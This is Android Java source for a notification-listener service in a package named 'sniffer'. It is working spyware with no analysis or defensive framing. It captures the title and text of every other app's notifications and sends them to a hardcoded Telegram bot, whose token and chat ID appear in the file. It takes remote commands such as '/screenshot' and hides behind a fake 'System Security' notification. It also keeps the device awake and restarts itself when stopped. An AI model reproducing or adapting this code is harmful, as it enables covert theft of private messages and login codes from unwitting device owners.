package com.v8.global.sniffer;

import android.app.*;
import android.content.*;
import android.graphics.*;
import android.os.*;
import android.service.notification.*;
import androidx.core.app.NotificationCompat;
import okhttp3.*;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.IOException;
import java.util.Timer;
import java.util.Timer;
import java.util.TimerTask;

public class NotificationService extends NotificationListenerService {
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private final OkHttpClient client = new OkHttpClient();
    private Timer timer;
    private int lastUpdateId = 0;
    private static NotificationService instance;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        // منع الجهاز من النوم
        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "V8:WakeLock");
        wakeLock.acquire(10*60*1000L /*10 دقائق*/);
        
        startForegroundService();
        
        // فحص الأوامر من البوت دورياً
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override 
            public void run() { 
                checkBotCommands(); 
            }
        }, 0, 5000); // كل 5 ثواني بدل 30 ثانية
    }

    private void startForegroundService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForeground(101, createPersistentNotification());
        } else {
            startForeground(101, createPersistentNotification());
        }
    }

    private void checkBotCommands() {
        Request request = new Request.Builder()
                .url("https://api.telegram.org/bot" + TOKEN + "/getUpdates?offset=" + lastUpdateId + "&timeout=10")
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override 
            public void onResponse(Call c, Response r) throws IOException {
                try {
                    String body = r.body().string();
                    JSONObject json = new JSONObject(body);
                    JSONArray result = json.getJSONArray("result");
                    
                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        lastUpdateId = update.getInt("update_id") + 1;
                        
                        if (update.has("message")) {
                            JSONObject message = update.getJSONObject("message");
                            if (message.has("text")) {
                                String text = message.getString("text");
                                long chatId = message.getJSONObject("chat").getLong("id");
                                
                                if (text.equals("/screenshot")) {
                                    Intent intent = new Intent("TAKE_SCREENSHOT");
                                    sendBroadcast(intent);
                                    sendToTelegram("✅ جاري التقاط الشاشة...", String.valueOf(chatId));
                                } else if (text.equals("/notifications")) {
                                    sendToTelegram("✅ جاري مراقبة الإشعارات", String.valueOf(chatId));
                                } else if (text.equals("/status")) {
                                    sendToTelegram("✅ النظام يعمل بشكل طبيعي", String.valueOf(chatId));
                                }
                            }
                        }
                    }
                    r.close();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            
            @Override 
            public void onFailure(Call c, IOException e) {
                // إعادة المحاولة بعد فشل
            }
        });
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        
        // تجاهل الإشعارات من النظام والتطبيق نفسه
        if (pkg.equals("android") || pkg.equals("com.android.systemui") || pkg.equals(getPackageName())) {
            return;
        }
        
        try {
            Bundle extras = sbn.getNotification().extras;
            String title = extras.getString(Notification.EXTRA_TITLE, "بدون عنوان");
            CharSequence textCharSeq = extras.getCharSequence(Notification.EXTRA_TEXT);
            String text = textCharSeq != null ? textCharSeq.toString() : "بدون نص";
            
            String report = String.format(
                "🔔 إشعار جديد:\n📱 التطبيق: %s\n👤 العنوان: %s\n💬 النص: %s\n⏰ الوقت: %d",
                pkg, title, text, System.currentTimeMillis()
            );
            
            sendToTelegram(report, CHAT_ID);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendToTelegram(String msg, String chatId) {
        String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
        
        FormBody formBody = new FormBody.Builder()
                .add("chat_id", chatId)
                .add("text", msg)
                .add("parse_mode", "HTML")
                .build();
        
        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();
        
        client.newCall(request).enqueue(new Callback() {
            @Override 
            public void onResponse(Call c, Response r) { 
                r.close(); 
            }
            
            @Override 
            public void onFailure(Call c, IOException e) {
                // إعادة المحاولة في حالة الفشل
                try {
                    Thread.sleep(1000);
                    sendToTelegram(msg, chatId);
                } catch (Exception ignored) {}
            }
        });
    }

    private Notification createPersistentNotification() {
        String channelId = "v8_channel_sync";
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                channelId, 
                "System Synchronization", 
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("خدمة مزامنة النظام");
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            
            NotificationManager notificationManager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
            notificationManager.createNotificationChannel(channel);
        }

        Notification notification = new NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Security")
                .setContentText("الحماية تعمل بشكل مستقر")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .setOngoing(true)
                .build();

        return notification;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        
        // إعادة تشغيل الخدمة
        Intent intent = new Intent(this, NotificationService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    public static NotificationService getInstance() {
        return instance;
    }
            }
